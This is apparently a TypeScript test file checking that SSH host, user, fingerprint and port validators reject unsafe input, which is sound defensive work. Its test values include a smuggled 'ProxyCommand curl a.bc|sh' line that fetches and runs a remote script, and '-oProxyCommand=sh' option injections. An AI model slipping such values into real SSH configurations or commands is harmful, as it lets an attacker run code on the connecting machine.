import { describe, expect, it } from "bun:test"
import {
  isSshFingerprint,
  isSshHost,
  isSshPort,
  isSshUser,
  SSH_FINGERPRINT_PATTERN,
  SSH_HOST_MAX,
  SSH_HOST_PATTERN,
  SSH_USER_PATTERN,
} from "./index"

const INJECTION = "x\nProxyCommand curl a.bc|sh"

describe("isSshHost", () => {
  it("accepts a DNS name, an IPv4 address and an IPv6 address", () => {
    for (const host of [
      "vps.test",
      "vps-1.example.com",
      "my_box",
      "localhost",
      "203.0.113.7",
      "2001:db8::1",
      "::1",
      "fe80::a:b:c:d",
      "2001:0db8:0000:0000:0000:ff00:0042:8329",
      "::ffff:192.0.2.1",
    ]) {
      expect(isSshHost(host)).toBe(true)
    }
  })

  it("refuses what would break a configuration line or read as an option", () => {
    for (const host of [
      "",
      INJECTION,
      "vps.test\n",
      "vps test",
      "vps.test\tProxyCommand",
      "vps.test\r",
      "-oProxyCommand=sh",
      "vps.test\u0000",
      "vps.test\u007f",
      "%h",
      "vps..test",
      "[2001:db8::1]",
      "fe80::1%eth0",
      "1::2::3",
      "user@vps.test",
      'vps.test"',
    ]) {
      expect(isSshHost(host)).toBe(false)
    }
  })

  it("refuses a name longer than DNS allows", () => {
    const label = "a".repeat(63)
    const long = [label, label, label, label].join(".")

    expect(long.length).toBeGreaterThan(SSH_HOST_MAX)
    expect(isSshHost(long)).toBe(false)
    expect(isSshHost("a".repeat(64))).toBe(false)
  })

  it("refuses what is not a string", () => {
    expect(isSshHost(null)).toBe(false)
    expect(isSshHost(42)).toBe(false)
  })

  it("shares its rule with the pattern the API schemas read", () => {
    const pattern = new RegExp(SSH_HOST_PATTERN)

    expect(pattern.test("2001:db8::1")).toBe(true)
    expect(pattern.test(INJECTION)).toBe(false)
  })
})

describe("isSshUser", () => {
  it("accepts a POSIX account name", () => {
    for (const user of ["root", "dev", "ubuntu", "_svc", "deploy-1", "a_b"]) {
      expect(isSshUser(user)).toBe(true)
    }
  })

  it("refuses the payload that adds a directive to the SSH configuration", () => {
    expect(isSshUser(INJECTION)).toBe(false)
    expect(new RegExp(SSH_USER_PATTERN).test(INJECTION)).toBe(false)
  })

  it("refuses an option, a space, a control character or a token", () => {
    for (const user of [
      "",
      "-oProxyCommand=sh",
      "dev ",
      " dev",
      "dev\n",
      "dev\u0000",
      "1dev",
      "dev@host",
      "%u",
      "$HOME",
      "a".repeat(33),
    ]) {
      expect(isSshUser(user)).toBe(false)
    }
  })

  it("refuses what is not a string", () => {
    expect(isSshUser(undefined)).toBe(false)
  })
})

describe("isSshFingerprint", () => {
  it("accepts a SHA256 fingerprint as ssh-keygen writes it", () => {
    expect(
      isSshFingerprint("SHA256:47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU")
    ).toBe(true)
  })

  it("refuses a fingerprint that carries anything other than base64", () => {
    expect(isSshFingerprint(`SHA256:abc${INJECTION}`)).toBe(false)
    expect(isSshFingerprint("MD5:ab:cd")).toBe(false)
    expect(isSshFingerprint("SHA256:")).toBe(false)
    expect(new RegExp(SSH_FINGERPRINT_PATTERN).test("SHA256:a b")).toBe(false)
  })
})

describe("isSshPort", () => {
  it("accepts a TCP port and refuses the rest", () => {
    expect(isSshPort(22)).toBe(true)
    expect(isSshPort(65_535)).toBe(true)
    expect(isSshPort(0)).toBe(false)
    expect(isSshPort(65_536)).toBe(false)
    expect(isSshPort(22.5)).toBe(false)
    expect(isSshPort("22")).toBe(false)
  })
})
